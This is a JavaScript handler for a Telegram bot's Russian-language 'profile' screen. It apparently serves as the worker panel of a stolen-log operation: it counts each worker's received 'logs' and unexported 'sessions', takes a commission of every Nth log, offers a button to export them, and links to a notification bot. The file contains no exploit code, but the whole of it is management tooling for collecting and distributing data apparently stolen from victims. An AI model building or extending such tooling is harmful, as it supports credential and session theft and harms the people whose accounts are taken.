import { bot } from "../../index.js";
import Database from "../../../database/index.js";
import Commission from "../../../database/schemas/commission.js";
import Log from "../../../database/schemas/log.js";
import { declineDays } from "../../../utils/index.js";
import config from '../../../../config.json' assert {type: 'json'};
import TelegramBot from "node-telegram-bot-api";

export default {
    name: "profile",

    async exec(query, [action]) {
        const [
            user,
            logsUser,
            commissionDoc,
            unexportedLogsCount,
            notifyBot
        ] = await Promise.all([
            Database.getUser(query.from.id),
            Database.getLogsSummary(query.from.id),
            Commission.findOne({}, { value: 1 }).lean(),
            Log.countDocuments({
                worker: query.from.id,
                exported: false,
                bot: { $ne: 'com' }
            }),
            new TelegramBot(config.notify_token, { polling: false }).getMe()
        ]);
        const registeredDays = Math.floor((Date.now() - user.reg) / (1000 * 60 * 60 * 24));
        const registered = declineDays(registeredDays);

        let message = `*💻 Личный кабинет*

*🆔 Ваш ID:* \`${query.from.id}\`
*🧾 Комиссия:* \`Каждый ${user.com || commissionDoc.value} лог\`

>*📊 Получено логов:* 
>За сегодня: ${logsUser.d}
>За месяц: ${logsUser.m}
>За всё время: ${logsUser.all}


*📆 В команде:* \`${registered}\`
*📁 Общее количество не выгруженных сессий:* \`${unexportedLogsCount}\``;


        if(action === 'toggle') {
            let keyboard = query.message.reply_markup.inline_keyboard;
            let report_day = user.report_day;
            await user.updateOne({ $set: { report_day: !report_day } });
            report_day = !report_day;
                
            keyboard[1][0].text = `📊 Отчет дня ${report_day ? '🟢' : '🔴'}`;
            
            return await bot.editMessageCaption(query, message, {
                reply_markup: {
                    inline_keyboard: keyboard
                },
                parse_mode: 'MarkdownV2',
                message_id: query.message.message_id,
                chat_id: query.message.chat.id
            }, 'cdn/profile.png');
        }
      

      

        await bot.editMessageCaption(query, message, {
            parse_mode: 'MarkdownV2',
            message_id: query.message.message_id,
            chat_id: query.message.chat.id,
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '📩 Выгрузить',
                            callback_data: `export:${query.from.id}`
                        },
                        {
                            text: '🔔 Отстук',
                            url: `https://t.me/${notifyBot.username}`
                        }
                    ],
                    [
                        {
                            text: `📊 Отчет дня ${user.report_day ? '🟢' : '🔴'}`,
                            callback_data: `profile:toggle:${query.from.id}`
                        },

                    ],
                    [
                        {
                            text: '🔙 Назад',
                            callback_data: 'start'
                        }
                    ]
                ]
            }
        }, 'cdn/profile.png');
    }
}
